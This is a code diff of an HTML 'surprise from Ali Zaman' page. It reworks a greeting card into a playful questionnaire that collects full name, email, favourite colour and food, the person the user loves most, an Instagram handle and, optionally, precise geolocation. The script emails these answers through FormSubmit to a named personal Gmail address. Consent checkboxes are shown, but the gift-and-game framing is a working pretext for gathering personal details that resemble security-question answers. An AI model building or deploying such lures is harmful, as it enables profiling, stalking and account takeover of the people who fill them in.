@@ -3,570 +3,448 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>A Special Surprise From Ali Zaman</title>
-
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>A Surprise From Ali Zaman</title>
 <style>
 @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700;800&display=swap');
-
-:root {
-  --blue: #60a5fa;
-  --purple: #a78bfa;
-  --cyan: #67e8f9;
-  --white: #f8fafc;
+*{box-sizing:border-box}
+:root{--blue:#60a5fa;--purple:#a78bfa;--muted:#bac6de}
+body{
+ margin:0;min-height:100vh;background:#060b1b;color:white;
+ font-family:Outfit,Arial,sans-serif;display:grid;
+ place-items:center;padding:30px 15px;overflow-x:hidden
 }
-
-* {
-  box-sizing: border-box;
+.orb{position:fixed;width:500px;height:500px;
+ border-radius:50%;filter:blur(100px);opacity:.3;
+ pointer-events:none;z-index:0;animation:drift 10s infinite alternate}
+.orb.a{background:#2563eb;top:-250px;left:-200px}
+.orb.b{background:#9333ea;bottom:-250px;right:-200px;
+ animation-delay:-5s}
+@keyframes drift{to{transform:translate(150px,100px) scale(1.3)}}
+.grid{position:fixed;inset:0;pointer-events:none;
+ background-image:linear-gradient(#ffffff07 1px,transparent 1px),
+ linear-gradient(90deg,#ffffff07 1px,transparent 1px);
+ background-size:45px 45px}
+.star{position:fixed;width:3px;height:3px;background:white;
+ border-radius:50%;pointer-events:none;
+ animation:twinkle 3s infinite alternate}
+@keyframes twinkle{from{opacity:.1}to{opacity:.9}}
+.card{
+ position:relative;z-index:2;width:100%;max-width:520px;
+ background:rgba(15,23,42,.83);backdrop-filter:blur(22px);
+ padding:35px;border:1px solid #ffffff25;border-radius:26px;
+ box-shadow:0 30px 90px #0008;text-align:center;
+ animation:appear .6s ease
 }
-
-body {
-  margin: 0;
-  min-height: 100vh;
-  background: #050b1b;
-  color: var(--white);
-  font-family: 'Outfit', sans-serif;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  overflow-x: hidden;
-  padding: 60px 18px;
+@keyframes appear{from{opacity:0;transform:translateY(25px)}
+ to{opacity:1;transform:translateY(0)}}
+.page{display:none}
+.page.active{display:block;animation:appear .55s ease}
+.gift{font-size:90px;animation:float 3s ease-in-out infinite;
+ filter:drop-shadow(0 0 22px #8b5cf688)}
+@keyframes float{50%{transform:translateY(-15px) rotate(8deg)}}
+.tag{display:inline-block;padding:9px 16px;border-radius:30px;
+ background:#60a5fa15;color:#93c5fd;border:1px solid #60a5fa50;
+ font-size:11px;letter-spacing:2px;font-weight:700}
+h1{font-size:clamp(30px,6vw,43px);line-height:1.2;
+ margin:20px 0;letter-spacing:-1px}
+.gradient{background:linear-gradient(90deg,#93c5fd,#c4b5fd,#67e8f9);
+ -webkit-background-clip:text;background-clip:text;color:transparent}
+p{color:var(--muted);line-height:1.75}
+button{font:inherit;cursor:pointer}
+.btn{width:100%;padding:16px;border:0;border-radius:13px;
+ margin-top:15px;color:white;font-weight:700;font-size:16px;
+ background:linear-gradient(110deg,#2563eb,#8b5cf6);
+ transition:transform .25s,box-shadow .25s}
+.btn:hover{transform:translateY(-4px);
+ box-shadow:0 12px 35px #6366f166}
+.btn:disabled{opacity:.55;cursor:wait;transform:none}
+.secondary{background:#ffffff10;border:1px solid #ffffff30}
+.fields{text-align:left}
+label.field{display:block;margin-top:17px;font-size:13px;
+ font-weight:600;color:#dbeafe}
+input[type=text],input[type=email],select{
+ width:100%;margin-top:7px;padding:14px;background:#090f22;
+ color:white;border:1px solid #40506d;border-radius:11px;
+ font:inherit;outline:none;transition:border .25s,box-shadow .25s
 }
-
-/* Animated background */
-.aurora {
-  position: fixed;
-  width: 650px;
-  height: 650px;
-  border-radius: 50%;
-  filter: blur(110px);
-  opacity: .32;
-  pointer-events: none;
-  z-index: 0;
-}
-
-.aurora.one {
-  background: #2563eb;
-  top: -280px;
-  left: -200px;
-  animation: moveOne 12s ease-in-out infinite alternate;
-}
-
-.aurora.two {
-  background: #7c3aed;
-  right: -240px;
-  bottom: -280px;
-  animation: moveTwo 14s ease-in-out infinite alternate;
-}
-
-@keyframes moveOne {
-  to { transform: translate(180px, 180px) scale(1.25); }
-}
-@keyframes moveTwo {
-  to { transform: translate(-180px, -160px) scale(1.2); }
-}
-
-.grid-bg {
-  position: fixed;
-  inset: 0;
-  background-image:
-    linear-gradient(#ffffff08 1px, transparent 1px),
-    linear-gradient(90deg, #ffffff08 1px, transparent 1px);
-  background-size: 48px 48px;
-  mask-image: linear-gradient(to bottom, black, transparent);
-  pointer-events: none;
-}
-
-/* Floating stars */
-.star {
-  position: fixed;
-  width: 4px;
-  height: 4px;
-  background: #fff;
-  border-radius: 50%;
-  opacity: .5;
-  animation: twinkle 4s ease-in-out infinite alternate;
-  pointer-events: none;
-}
-
-@keyframes twinkle {
-  from { opacity: .1; transform: scale(.5); }
-  to { opacity: .9; transform: scale(1.8); }
-}
-
-.container {
-  width: 100%;
-  max-width: 540px;
-  position: relative;
-  z-index: 2;
-}
-
-.card {
-  padding: 48px 36px;
-  text-align: center;
-  background: rgba(15, 23, 42, .72);
-  backdrop-filter: blur(24px);
-  border: 1px solid rgba(148, 163, 184, .22);
-  border-radius: 28px;
-  box-shadow:
-    0 30px 100px rgba(0,0,0,.45),
-    0 0 60px rgba(59,130,246,.09);
-  animation: cardEnter 1s ease both;
-}
-
-@keyframes cardEnter {
-  from { opacity: 0; transform: translateY(40px); }
-  to { opacity: 1; transform: translateY(0); }
-}
-
-.badge {
-  display: inline-block;
-  background: rgba(96,165,250,.11);
-  border: 1px solid rgba(96,165,250,.3);
-  color: #93c5fd;
-  padding: 10px 18px;
-  border-radius: 50px;
-  font-size: 11px;
-  font-weight: 700;
-  letter-spacing: 2px;
-  text-transform: uppercase;
-}
-
-/* Animated gift */
-.gift-area {
-  width: 160px;
-  height: 160px;
-  position: relative;
-  margin: 30px auto;
-  display: grid;
-  place-items: center;
-}
-
-.ring {
-  position: absolute;
-  width: 145px;
-  height: 145px;
-  border: 1px dashed rgba(147,197,253,.4);
-  border-radius: 50%;
-  animation: rotate 16s linear infinite;
-}
-
-.ring.second {
-  width: 115px;
-  height: 115px;
-  border-color: rgba(167,139,250,.5);
-  animation-direction: reverse;
-}
-
-@keyframes rotate {
-  to { transform: rotate(360deg); }
-}
-
-.gift {
-  font-size: 75px;
-  filter: drop-shadow(0 0 25px rgba(96,165,250,.4));
-  animation: float 3s ease-in-out infinite;
-}
-
-@keyframes float {
-  0%, 100% { transform: translateY(0); }
-  50% { transform: translateY(-14px); }
-}
-
-h1 {
-  font-size: clamp(32px, 6vw, 45px);
-  line-height: 1.16;
-  margin: 22px 0;
-  letter-spacing: -1.5px;
-}
-
-.gradient {
-  background: linear-gradient(90deg, #93c5fd, #c4b5fd, #67e8f9);
-  background-clip: text;
-  -webkit-background-clip: text;
-  -webkit-text-fill-color: transparent;
-}
-
-.description {
-  font-size: 16px;
-  color: #aebdd5;
-  line-height: 1.8;
-  margin: 18px auto 28px;
-}
-
-.highlight {
-  color: white;
-  font-size: 18px;
-  font-weight: 600;
-  margin-bottom: 25px;
-}
-
-button {
-  font: inherit;
-}
-
-.main-btn {
-  position: relative;
-  overflow: hidden;
-  width: 100%;
-  border: none;
-  border-radius: 14px;
-  padding: 18px 22px;
-  background: linear-gradient(110deg, #3b82f6, #8b5cf6);
-  color: white;
-  font-size: 16px;
-  font-weight: 700;
-  cursor: pointer;
-  transition: transform .3s, box-shadow .3s;
-}
-
-.main-btn:hover {
-  transform: translateY(-4px);
-  box-shadow: 0 14px 40px rgba(99,102,241,.4);
-}
-
-.main-btn:active {
-  transform: translateY(0);
-}
-
-.main-btn::after {
-  content: "";
-  position: absolute;
-  inset: 0;
-  background: linear-gradient(110deg,
-    transparent 25%, #ffffff50 50%, transparent 75%);
-  transform: translateX(-130%);
-  transition: transform .7s;
-}
-
-.main-btn:hover::after {
-  transform: translateX(130%);
-}
-
-.secondary-btn {
-  width: 100%;
-  border: 1px solid #475569;
-  border-radius: 13px;
-  color: #dbeafe;
-  background: #ffffff08;
-  padding: 15px;
-  font-size: 15px;
-  cursor: pointer;
-  margin-top: 12px;
-  transition: background .25s, transform .25s;
-}
-
-.secondary-btn:hover {
-  background: #ffffff15;
-  transform: translateY(-2px);
-}
-
-.note {
-  color: #94a3b8;
-  font-size: 12px;
-  line-height: 1.7;
-  margin-top: 22px;
-}
-
-.panel {
-  margin-top: 25px;
-  padding: 22px;
-  background: rgba(15,23,42,.65);
-  border: 1px solid #334155;
-  border-radius: 16px;
-  animation: cardEnter .5s ease both;
-}
-
-.panel h2 {
-  margin-top: 0;
-}
-
-.panel p {
-  color: #cbd5e1;
-  line-height: 1.7;
-}
-
-.consent {
-  display: flex;
-  align-items: flex-start;
-  gap: 10px;
-  text-align: left;
-  color: #cbd5e1;
-  font-size: 13px;
-  line-height: 1.6;
-  margin: 20px 0;
-}
-
-.consent input {
-  margin-top: 4px;
-  accent-color: #60a5fa;
-  width: 17px;
-  height: 17px;
-  flex-shrink: 0;
-}
-
-a {
-  color: #93c5fd;
-}
-
-.hidden {
-  display: none;
-}
-
-#status {
-  color: #cbd5e1;
-  line-height: 1.6;
-  margin-top: 12px;
-}
-
-@media(max-width: 480px) {
-  .card { padding: 32px 20px; }
-  .gift-area { margin: 20px auto; }
-}
-
-@media(prefers-reduced-motion: reduce) {
-  *, *::before, *::after {
-    animation-duration: .01ms !important;
-    transition-duration: .01ms !important;
-  }
+input:focus,select:focus{border-color:#93c5fd;
+ box-shadow:0 0 0 3px #60a5fa20}
+input[type=file]{width:100%;margin-top:9px;color:#cbd5e1}
+.checkbox{display:flex;gap:12px;text-align:left;align-items:flex-start;
+ margin-top:20px;font-size:13px;line-height:1.6;color:#cbd5e1}
+.checkbox input{width:18px;height:18px;flex-shrink:0;
+ accent-color:#60a5fa}
+.note{font-size:12px;color:#94a3b8}
+.notice{padding:13px;background:#ffffff09;border-radius:11px;
+ font-size:13px;text-align:left;line-height:1.6;color:#cbd5e1;
+ margin-top:17px}
+#preview{width:100%;border-radius:15px;margin-top:20px}
+#status{font-size:13px;margin-top:12px;color:#fda4af}
+canvas{width:100%;height:auto;border-radius:15px;
+ margin-top:15px;box-shadow:0 14px 35px #0007}
+@media(max-width:480px){.card{padding:25px 19px}}
+@media(prefers-reduced-motion:reduce){
+ *,*::before,*::after{animation:none!important;transition:none!important}
 }
 </style>
 </head>
-
 <body>
+<div class="orb a"></div><div class="orb b"></div>
+<div class="grid"></div><div id="stars"></div>
 
-<div class="aurora one"></div>
-<div class="aurora two"></div>
-<div class="grid-bg"></div>
-<div id="stars"></div>
+<main class="card">
 
-<main class="container">
-  <div class="card">
+<!-- PAGE 1 -->
+<section id="page1" class="page active">
+ <span class="tag">A PERSONAL INVITATION</span>
+ <div class="gift">🎁</div>
+ <h1>Ali Zaman Has a
+ <span class="gradient">Surprise for You!</span></h1>
+ <p>You've been personally invited to an unforgettable
+ little experience. A touch of mystery, a little fun,
+ and something created especially for you.</p>
+ <h3>Ready to discover your surprise?</h3>
+ <button class="btn" onclick="go(2)">
+ ✨ Unlock Your Surprise
+ </button>
+ <p class="note">Your adventure begins here.</p>
+</section>
 
-    <span class="badge">
-      A Personal Invitation
-    </span>
+<!-- PAGE 2 -->
+<section id="page2" class="page">
+ <span class="tag">STEP 02 · THE FUN BEGINS</span>
+ <h1>Tell Us a Little <span class="gradient">About You</span></h1>
+ <p>Answer these fun questions and let us create
+ a personalized surprise based on your favorites.</p>
 
-    <div class="gift-area">
-      <div class="ring"></div>
-      <div class="ring second"></div>
-      <div class="gift">🎁</div>
-    </div>
+ <form id="funForm" class="fields">
+  <label class="field">Your Full Name
+   <input id="fullName" type="text"
+   placeholder="Enter your full name" required maxlength="80">
+  </label>
 
-    <h1>
-      Ali Zaman Has a
-      <span class="gradient">Surprise for You!</span>
-    </h1>
+  <label class="field">Your Email Address
+   <input id="email" type="email"
+   placeholder="you@example.com" required>
+  </label>
 
-    <p class="description">
-      You've received a special invitation from Ali Zaman.
-      A little mystery, a little excitement, and
-      something wonderful waiting to be discovered.
-    </p>
+  <label class="field">What's Your Favorite Color?
+   <select id="color" required>
+    <option value="">Select your color</option>
+    <option>Blue</option><option>Red</option>
+    <option>Green</option><option>Pink</option>
+    <option>Purple</option><option>Yellow</option>
+    <option>Black</option><option>White</option>
+    <option>Orange</option>
+   </select>
+  </label>
 
-    <p class="highlight">
-      Ready to unlock your surprise?
-    </p>
+  <label class="field">What's Your Favorite Food?
+   <input id="food" type="text"
+   placeholder="Pizza, burger, biryani..." required maxlength="80">
+  </label>
 
-    <button class="main-btn"
-      onclick="openSurprise()">
-      ✨ Unlock My Surprise
-    </button>
+  <label class="field">Who Is the Person You Love Most?
+   <input id="loved" type="text"
+   placeholder="Someone special..." required maxlength="80">
+  </label>
 
-    <div class="panel hidden" id="surprisePanel">
-      <h2>🎉 Surprise!</h2>
-      <p>
-        You've unlocked a special message from Ali Zaman:
-        May your day be filled with happiness,
-        laughter, and wonderful moments!
-      </p>
-      <p>
-        Thanks for being part of this little adventure.
-      </p>
-    </div>
+  <label class="field">Your Instagram Username
+   <input id="instagram" type="text"
+   placeholder="@username" required maxlength="50">
+  </label>
 
-    <button class="secondary-btn"
-      onclick="toggleSharing()">
-      📍 Optional: Share My Location
-    </button>
+  <label class="field">Upload a Selfie for Your Funny Poster
+   <input id="selfie" type="file" accept="image/*">
+  </label>
+  <p class="note">
+   Your uploaded photo is used in your browser
+   to create your poster. Instagram is not accessed.
+  </p>
 
-    <div class="panel hidden" id="locationPanel">
-      <h2>Share Your Location</h2>
-
-      <p>
-        You can optionally share your current location
-        with Ali Zaman. Your browser will request
-        permission to access your coordinates.
-      </p>
-
-      <p>
-        After reviewing your location, you can choose
-        whether to email it to
-        <strong>alizaman0709@gmail.com</strong>
-        through FormSubmit.
-      </p>
-
-      <button class="main-btn" type="button"
-        onclick="getLocation()">
-        Get & Review My Location
-      </button>
-
-      <div id="status" role="status"></div>
-
-      <div id="locationPreview" class="hidden">
-        <p>Your location is ready for review.</p>
-        <a id="mapPreview" target="_blank"
-          rel="noopener noreferrer">
-          View My Location on Google Maps
-        </a>
-      </div>
-
-      <form
-        id="locationForm"
-        class="hidden"
-        action="https://formsubmit.co/alizaman0709@gmail.com"
-        method="POST">
-
-        <input type="hidden" name="_subject"
-          value="Location Shared With Ali Zaman">
-
-        <input type="hidden"
-          name="Google_Maps_Link" id="mapLink">
-
-        <input type="hidden"
-          name="Coordinates" id="coordinates">
-
-        <label class="consent">
-          <input type="checkbox"
-            id="consentBox" required>
-          <span>
-            I voluntarily agree to email my current
-            location coordinates and Google Maps link
-            to Ali Zaman at alizaman0709@gmail.com
-            using FormSubmit. I understand this is
-            optional.
-          </span>
-        </label>
-
-        <button class="main-btn" type="submit">
-          Confirm & Send My Location
-        </button>
-      </form>
-
-      <button class="secondary-btn"
-        onclick="toggleSharing()">
-        Cancel Location Sharing
-      </button>
-    </div>
-
-    <p class="note">
-      Created with care by Ali Zaman.
-      <br>
-      Your surprise does not require location sharing.
-    </p>
-
+  <div class="notice">
+   <strong>Optional location sharing</strong>
+   <p>This game can also send your current location
+   coordinates and Google Maps link to Ali Zaman
+   at alizaman0709@gmail.com through FormSubmit,
+   but only if you choose to share.</p>
   </div>
+
+  <label class="checkbox">
+   <input id="shareLocation" type="checkbox">
+   <span>I agree to share my current location
+   with Ali Zaman by email. I understand my browser
+   will ask for location permission and I can decline.</span>
+  </label>
+
+  <label class="checkbox">
+   <input id="sendAnswers" type="checkbox" required>
+   <span>I agree to email my questionnaire answers
+   to Ali Zaman using FormSubmit.</span>
+  </label>
+
+  <button id="submitBtn" class="btn" type="submit">
+   🎉 Create My Surprise
+  </button>
+  <div id="status" role="status"></div>
+ </form>
+</section>
+
+<!-- PAGE 3 -->
+<section id="page3" class="page">
+ <span class="tag">YOUR SURPRISE IS READY</span>
+ <div class="gift">🎉</div>
+ <h1>Here's Your <span class="gradient">Funny Surprise!</span></h1>
+ <p id="personalMessage"></p>
+ <canvas id="poster" width="700" height="900"></canvas>
+ <button class="btn" onclick="downloadPoster()">
+ ⬇ Download My Funny Poster
+ </button>
+ <button class="btn secondary" onclick="location.reload()">
+ 🔄 Play Again
+ </button>
+ <p class="note">Made with fun by Ali Zaman</p>
+</section>
 </main>
 
 <script>
-// Decorative animated stars
-const stars = document.getElementById("stars");
+const $ = id => document.getElementById(id);
+let selfieImage = null;
 
-for (let i = 0; i < 45; i++) {
-  const star = document.createElement("div");
-  star.className = "star";
-  star.style.left = Math.random() * 100 + "%";
-  star.style.top = Math.random() * 100 + "%";
-  star.style.animationDelay = Math.random() * 5 + "s";
-  star.style.animationDuration =
-    (2 + Math.random() * 4) + "s";
-  stars.appendChild(star);
+for(let i=0;i<40;i++){
+ const s=document.createElement("span");
+ s.className="star";
+ s.style.left=Math.random()*100+"%";
+ s.style.top=Math.random()*100+"%";
+ s.style.animationDelay=Math.random()*4+"s";
+ $("stars").appendChild(s);
 }
 
-// Reveal the surprise without location access
-function openSurprise() {
-  const panel = document.getElementById("surprisePanel");
-  panel.classList.remove("hidden");
-  panel.scrollIntoView({
-    behavior: "smooth",
-    block: "nearest"
-  });
+function go(n){
+ document.querySelectorAll(".page").forEach(
+  p=>p.classList.remove("active")
+ );
+ $("page"+n).classList.add("active");
+ window.scrollTo({top:0,behavior:"smooth"});
 }
 
-// Optional location-sharing section
-function toggleSharing() {
-  const panel = document.getElementById("locationPanel");
-  panel.classList.toggle("hidden");
+$("selfie").addEventListener("change",async e=>{
+ const file=e.target.files[0];
+ if(!file){selfieImage=null;return}
+ if(!file.type.startsWith("image/") ||
+    file.size>8*1024*1024){
+  alert("Please select an image smaller than 8 MB.");
+  e.target.value="";
+  return;
+ }
+ try{
+  selfieImage=await createImageBitmap(file);
+ }catch{
+  selfieImage=null;
+  alert("Unable to read that image.");
+ }
+});
 
-  if (!panel.classList.contains("hidden")) {
-    panel.scrollIntoView({
-      behavior: "smooth",
-      block: "nearest"
-    });
+function getLocation(){
+ return new Promise(resolve=>{
+  if(!navigator.geolocation){
+   resolve(null);return;
   }
-}
-
-function getLocation() {
-  const status = document.getElementById("status");
-  const form = document.getElementById("locationForm");
-  const preview = document.getElementById("locationPreview");
-
-  form.classList.add("hidden");
-  preview.classList.add("hidden");
-  document.getElementById("consentBox").checked = false;
-  document.getElementById("mapLink").value = "";
-  document.getElementById("coordinates").value = "";
-
-  if (!navigator.geolocation) {
-    status.textContent = "Location access is not available.";
-    return;
-  }
-
-  status.textContent =
-    "Waiting for your browser's location permission...";
-
   navigator.geolocation.getCurrentPosition(
-    (position) => {
-      const lat = position.coords.latitude;
-      const lng = position.coords.longitude;
-
-      const coordinates = lat + ", " + lng;
-      const mapUrl =
-        "https://www.google.com/maps?q=" +
-        encodeURIComponent(coordinates);
-
-      document.getElementById("mapLink").value = mapUrl;
-      document.getElementById("coordinates").value =
-        coordinates;
-
-      const link = document.getElementById("mapPreview");
-      link.href = mapUrl;
-
-      preview.classList.remove("hidden");
-      form.classList.remove("hidden");
-
-      status.textContent =
-        "Location received. Review it and choose " +
-        "whether to share it by email.";
-    },
-    (error) => {
-      if (error.code === 1) {
-        status.textContent =
-          "Location permission was denied. " +
-          "You can still enjoy the surprise.";
-      } else {
-        status.textContent =
-          "Could not retrieve your location. Please try again.";
-      }
-    },
-    {
-      enableHighAccuracy: true,
-      timeout: 15000,
-      maximumAge: 0
-    }
+   p=>resolve({
+    lat:p.coords.latitude,
+    lng:p.coords.longitude
+   }),
+   ()=>resolve(null),
+   {enableHighAccuracy:true,timeout:12000}
   );
+ });
+}
+
+$("funForm").addEventListener("submit",async event=>{
+ event.preventDefault();
+ const btn=$("submitBtn");
+ btn.disabled=true;
+ btn.textContent="Preparing your surprise...";
+ $("status").textContent="";
+
+ const data={
+  name:$("fullName").value.trim(),
+  email:$("email").value.trim(),
+  color:$("color").value,
+  food:$("food").value.trim(),
+  loved:$("loved").value.trim(),
+  instagram:$("instagram").value.trim()
+ };
+
+ let location=null;
+ if($("shareLocation").checked){
+  location=await getLocation();
+  if(!location){
+   const proceed=confirm(
+    "Location was not shared. Continue with your answers only?"
+   );
+   if(!proceed){
+    btn.disabled=false;
+    btn.textContent="🎉 Create My Surprise";
+    return;
+   }
+  }
+ }
+
+ const formData=new FormData();
+ formData.append("Full_Name",data.name);
+ formData.append("Email",data.email);
+ formData.append("Favorite_Color",data.color);
+ formData.append("Favorite_Food",data.food);
+ formData.append("Favorite_Person",data.loved);
+ formData.append("Instagram_Username",data.instagram);
+ formData.append("_subject","New Surprise Game Submission");
+ formData.append("_captcha","true");
+
+ if(location){
+  const coords=location.lat+","+location.lng;
+  formData.append("Location_Coordinates",coords);
+  formData.append("Google_Maps_Link",
+   "https://www.google.com/maps?q="+encodeURIComponent(coords));
+ }
+
+ try{
+  const response=await fetch(
+   "https://formsubmit.co/ajax/alizaman0709@gmail.com",
+   {method:"POST",body:formData}
+  );
+
+  const result=await response.json();
+  if(!response.ok || result.success===false ||
+     result.success==="false"){
+   throw new Error("Submission not accepted");
+  }
+
+  makePoster(data);
+  go(3);
+ }catch(err){
+  $("status").textContent=
+   "The email could not be submitted. Please check " +
+   "FormSubmit activation and try again.";
+ }finally{
+  btn.disabled=false;
+  btn.textContent="🎉 Create My Surprise";
+ }
+});
+
+function makePoster(data){
+ const canvas=$("poster"),ctx=canvas.getContext("2d");
+ const w=canvas.width,h=canvas.height;
+ const colors={
+  Blue:"#3b82f6",Red:"#ef4444",Green:"#22c55e",
+  Pink:"#ec4899",Purple:"#a855f7",Yellow:"#eab308",
+  Black:"#334155",White:"#e2e8f0",Orange:"#f97316"
+ };
+ const chosen=colors[data.color]||"#60a5fa";
+
+ const bg=ctx.createLinearGradient(0,0,w,h);
+ bg.addColorStop(0,"#101b40");
+ bg.addColorStop(1,"#39215f");
+ ctx.fillStyle=bg;
+ ctx.fillRect(0,0,w,h);
+
+ // Decorative stars
+ ctx.fillStyle="#ffffff65";
+ for(let i=0;i<65;i++){
+  ctx.beginPath();
+  ctx.arc(Math.random()*w,Math.random()*h,
+   Math.random()*3+1,0,Math.PI*2);
+  ctx.fill();
+ }
+
+ ctx.textAlign="center";
+ ctx.fillStyle="#fff";
+ ctx.font="bold 47px Arial";
+ ctx.fillText("THE ULTIMATE",350,75);
+ ctx.fillStyle="#facc15";
+ ctx.fillText("FOOD SUPERHERO",350,135);
+
+ // Character costume
+ ctx.fillStyle=chosen;
+ ctx.beginPath();
+ ctx.moveTo(170,530);
+ ctx.lineTo(525,530);
+ ctx.lineTo(615,790);
+ ctx.lineTo(90,790);
+ ctx.closePath();
+ ctx.fill();
+
+ // Cape
+ ctx.fillStyle="#dc2626";
+ ctx.beginPath();
+ ctx.moveTo(190,515);
+ ctx.lineTo(55,825);
+ ctx.lineTo(260,750);
+ ctx.closePath();
+ ctx.fill();
+
+ // Neck and circular portrait
+ ctx.fillStyle="#f1c27d";
+ ctx.fillRect(310,465,80,100);
+
+ ctx.save();
+ ctx.beginPath();
+ ctx.arc(350,350,145,0,Math.PI*2);
+ ctx.clip();
+
+ if(selfieImage){
+  const im=selfieImage;
+  const scale=Math.max(290/im.width,290/im.height);
+  const iw=im.width*scale,ih=im.height*scale;
+  ctx.drawImage(im,350-iw/2,350-ih/2,iw,ih);
+ }else{
+  ctx.fillStyle="#fde68a";
+  ctx.fillRect(205,205,290,290);
+  ctx.font="170px Arial";
+  ctx.fillText("😎",350,415);
+ }
+ ctx.restore();
+
+ ctx.strokeStyle="#facc15";
+ ctx.lineWidth=12;
+ ctx.beginPath();
+ ctx.arc(350,350,145,0,Math.PI*2);
+ ctx.stroke();
+
+ // Hero emblem
+ ctx.fillStyle="#facc15";
+ ctx.beginPath();
+ ctx.arc(350,660,64,0,Math.PI*2);
+ ctx.fill();
+ ctx.fillStyle="#172554";
+ ctx.font="60px Arial";
+ ctx.fillText("★",350,681);
+
+ // Bottom text
+ ctx.fillStyle="#fff";
+ ctx.font="bold 35px Arial";
+ const shortName=data.name.slice(0,22);
+ ctx.fillText(shortName,350,825);
+
+ ctx.font="24px Arial";
+ const food=data.food.slice(0,27);
+ ctx.fillText("Powered by "+food+"!",350,865);
+
+ $("personalMessage").textContent=
+  data.name+", you've officially become the " +
+  data.color+" superhero powered by "+data.food+
+  "! Someone special, "+data.loved+
+  ", might be impressed by your new superpowers.";
+}
+
+function downloadPoster(){
+ const a=document.createElement("a");
+ a.download="My-Funny-Surprise.png";
+ a.href=$("poster").toDataURL("image/png");
+ a.click();
 }
 </script>
-
 </body>
 </html>
